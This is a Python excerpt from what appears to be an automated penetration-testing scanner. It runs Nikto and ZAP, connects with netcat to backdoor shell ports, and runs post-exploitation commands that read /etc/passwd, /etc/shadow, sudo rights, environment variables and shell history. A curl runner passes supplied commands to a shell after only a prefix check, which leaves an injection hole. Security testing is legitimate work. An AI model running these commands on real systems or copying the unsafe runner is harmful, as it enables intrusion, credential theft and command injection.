    def _run_nikto(self, attack: dict) -> dict:
        port        = attack.get("port", 80)
        scheme      = "https" if port == 443 else "http"
        url         = f"{scheme}://{self.target}:{port}"
        output_file = f"{self.evidence_dir}/nikto_{port}.txt"

        try:
            cmd = [
                "nikto", "-h", url,
                "-o", output_file, "-Format", "txt",
                "-timeout", "10", "-maxtime", "300s",
            ]
            result  = subprocess.run(cmd, capture_output=True, text=True, timeout=330)
            output  = result.stdout + result.stderr
            finding_count = output.lower().count("osvdb") + output.count("+ ")
            success = finding_count > 3

            return {
                "success": success, "output": output[:3000],
                "output_file": output_file, "url": url,
                "findings_count": finding_count
            }

        except FileNotFoundError:
            return {"success": False, "output": "[ERROR] nikto not installed"}
        except subprocess.TimeoutExpired:
            return {"success": False, "output": "[TIMEOUT] Nikto exceeded 5 minutes"}
        except Exception as e:
            return {"success": False, "output": f"Nikto error: {str(e)}"}

    # ─────────────────────────────────────────────────────────────────────────
    # ZAP
    # ─────────────────────────────────────────────────────────────────────────

    def _run_zap(self, attack: dict) -> dict:
        import requests as req

        port   = attack.get("port", 80)
        scheme = "https" if port == 443 else "http"
        url    = f"{scheme}://{self.target}:{port}"
        ZAP_API = "http://localhost:8090"
        ZAP_KEY = "aegis_zap_key"

        try:
            # Spider first
            try:
                req.get(f"{ZAP_API}/JSON/spider/action/scan/",
                        params={"url": url, "apikey": ZAP_KEY}, timeout=10)
                time.sleep(10)
            except Exception:
                pass

            resp    = req.get(f"{ZAP_API}/JSON/ascan/action/scan/",
                              params={"url": url, "apikey": ZAP_KEY}, timeout=10)
            scan_id = resp.json().get("scan")

            for _ in range(100):
                time.sleep(3)
                status = req.get(
                    f"{ZAP_API}/JSON/ascan/view/status/",
                    params={"scanId": scan_id, "apikey": ZAP_KEY}, timeout=5
                ).json().get("status", "0")
                if status == "100":
                    break

            alerts = req.get(
                f"{ZAP_API}/JSON/alert/view/alerts/",
                params={"baseurl": url, "apikey": ZAP_KEY}, timeout=10
            ).json().get("alerts", [])

            high    = [a for a in alerts if a.get("risk") in ["High", "Critical"]]
            medium  = [a for a in alerts if a.get("risk") == "Medium"]
            output  = "\n".join(
                f"[{a.get('risk')}] {a.get('alert')} — {a.get('url')}"
                for a in alerts[:20]
            )
            success = len(high) > 0 or len(medium) >= 3

            return {"success": success, "output": output or "No alerts",
                    "alerts": len(alerts), "high": len(high), "medium": len(medium)}

        except req.exceptions.ConnectionError:
            return {"success": False, "output": "[ZAP NOT RUNNING] localhost:8090"}
        except Exception as e:
            return {"success": False, "output": f"ZAP error: {str(e)}"}

    # ─────────────────────────────────────────────────────────────────────────
    # NETCAT — connects to open backdoor/bindshell ports
    # ─────────────────────────────────────────────────────────────────────────

    def _run_netcat(self, attack: dict) -> dict:
        """
        Connects to open backdoor ports using netcat.
        Used for ingreslock (1524), pre-opened bindshells, etc.
        This is a legitimate pentest technique — real attackers use nc.
        """
        port    = attack.get("port", 1524)
        timeout = attack.get("options", {}).get("timeout", 10)

        try:
            proc = subprocess.Popen(
                ["nc", "-w", str(timeout), self.target, str(port)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            # Send identification commands
            commands = "id\nwhoami\nuname -a\ncat /etc/passwd\nexit\n"
            stdout, stderr = proc.communicate(
                input=commands.encode(), timeout=15
            )
            output = stdout.decode(errors='ignore')

            success = ("uid=" in output or "root" in output
                       or "/bin/bash" in output)

            return {
                "success": success,
                "output":  f"[NETCAT SHELL]\n{output[:3000]}",
                "tool":    "netcat",
                "port":    port
            }

        except subprocess.TimeoutExpired:
            proc.kill()
            return {"success": False, "output": "[TIMEOUT] nc connection timed out"}
        except FileNotFoundError:
            return {"success": False, "output": "[ERROR] netcat not installed"}
        except Exception as e:
            return {"success": False, "output": f"Netcat error: {str(e)}"}




    # ─────────────────────────────────────────────────────────────────────────
    # MANUAL — safe curl, splits compound commands
    # ─────────────────────────────────────────────────────────────────────────

    def _manual_instructions(self, attack: dict) -> dict:
        command = attack.get("command", "")

        if command and ("curl " in command or command.strip().startswith("curl")):
            os.makedirs(self.evidence_dir, exist_ok=True)
            sub_commands = [c.strip() for c in command.split("&&")]
            all_outputs  = []
            any_success  = False

            for idx, sub_cmd in enumerate(sub_commands):
                if not sub_cmd.startswith("curl"):
                    continue

                safe_path = (f"{self.evidence_dir}/"
                             f"curl_output_{attack.get('port', 0)}_{idx}.txt")
                safe_cmd = re.sub(r'-o\s+\S+', f'-o {safe_path}', sub_cmd)
                if ' -o ' not in safe_cmd and ' -O' not in safe_cmd:
                    safe_cmd = sub_cmd + f' -o {safe_path}'

                try:
                    result = subprocess.run(
                        safe_cmd, shell=True,
                        capture_output=True, text=True, timeout=30
                    )
                    output = ""
                    if os.path.exists(safe_path):
                        with open(safe_path, 'r', errors='ignore') as f:
                            output = f.read(2000)
                    if not output:
                        output = result.stdout[:2000] or result.stderr[:500]

                    sensitive = [
                        'api_key', 'password', 'passwd', 'secret', 'token',
                        'database', 'db_pass', 'db_user', 'aws_',
                        'private_key', 'access_key', 'smtp_',
                        'key=', 'pass=', 'secret=', 'token=',
                        'mysql', 'postgres', 'mongo', 'redis',
                        'begin rsa', 'begin private', 'ssh-rsa',
                    ]
                    if (result.returncode == 0 and len(output) > 50
                            and any(kw in output.lower() for kw in sensitive)):
                        any_success = True

                    all_outputs.append(
                        f"--- curl #{idx+1}: {sub_cmd[:80]} ---\n"
                        f"{output[:500]}\n")
                except subprocess.TimeoutExpired:
                    all_outputs.append(f"--- curl #{idx+1}: TIMEOUT ---\n")
                except Exception as e:
                    all_outputs.append(f"--- curl #{idx+1}: ERROR: {e} ---\n")

            if all_outputs:
                return {
                    "success": any_success,
                    "output":  "[EXECUTED]\n" + "\n".join(all_outputs),
                    "tool": "manual", "command": command,
                    "evidence_dir": self.evidence_dir
                }

        return {
            "success": None,
            "output": (
                f"[MANUAL TESTING REQUIRED]\n\n"
                f"Vulnerability: {attack.get('vulnerability', 'Unknown')}\n"
                f"Port: {attack.get('port', 'N/A')}\n\n"
                f"Command:\n{command}\n\n"
                f"Expected: {attack.get('expected_outcome', 'Unknown')}\n"
                f"Fallback: {attack.get('fallback', 'N/A')}"
            ),
            "tool": "manual"
        }

    # ─────────────────────────────────────────────────────────────────────────
    # POST-EXPLOITATION
    # ─────────────────────────────────────────────────────────────────────────

    def _post_exploitation(self, session) -> list:
        commands = [
            "id", "whoami", "uname -a",
            "cat /etc/passwd",
            "cat /etc/shadow 2>/dev/null || echo 'Permission denied'",
            "sudo -l",
            "find / -perm -4000 2>/dev/null | head -20",
            "ifconfig 2>/dev/null || ip a",
            "netstat -tulpn 2>/dev/null || ss -tulpn",
            "ps aux | head -30", "env",
            "cat /etc/crontab 2>/dev/null",
            "ls -la /home/",
            "history 2>/dev/null | tail -20",
        ]
        results = []
        try:
            for cmd in commands:
                session.write(cmd + "\n")
                time.sleep(0.5)
                output = session.read()
                results.append({"command": cmd, "output": output})
                self._append_evidence("post_exploitation.txt",
                                      f"$ {cmd}\n{output}\n\n")
        except Exception as e:
            results.append({"command": "error", "output": str(e)})
        return results

    # ─────────────────────────────────────────────────────────────────────────
    # EVIDENCE
    # ─────────────────────────────────────────────────────────────────────────

    def _save_evidence(self, result: dict, attack: dict):
        from scanner_ui.models import ForensicEvidence
        safe_result = {k: v for k, v in result.items() if k != "shell"}

        content = json.dumps({
            "timestamp":     datetime.now().isoformat(),
            "target":        self.target,
            "vulnerability": attack.get("vulnerability", ""),
            "tool":          attack.get("tool", ""),
            "module":        attack.get("module", ""),
            "port":          attack.get("port"),
            "cvss":          attack.get("cvss"),
            "confidence":    attack.get("confidence"),
            "result":        safe_result
        }, indent=2)

        filename = (f"{self.evidence_dir}/attack_"
                    f"{attack.get('tool','unknown')}_{attack.get('port',0)}.json")
        with open(filename, "w") as f:
            f.write(content)

        sha256 = hashlib.sha256(content.encode()).hexdigest()
        ForensicEvidence.objects.create(
            scan=self.scan_result, evidence_type="LOG",
            file_path=filename, sha256_hash=sha256,
            description=(
                f"{attack.get('tool','')} port {attack.get('port','')} — "
                f"{'SUCCESS' if result.get('success') else 'FAILED'} — "
                f"{attack.get('vulnerability','')[:60]}"
            )
        )

    def _append_evidence(self, filename: str, content: str):
        with open(f"{self.evidence_dir}/{filename}", "a") as f:
            f.write(content)


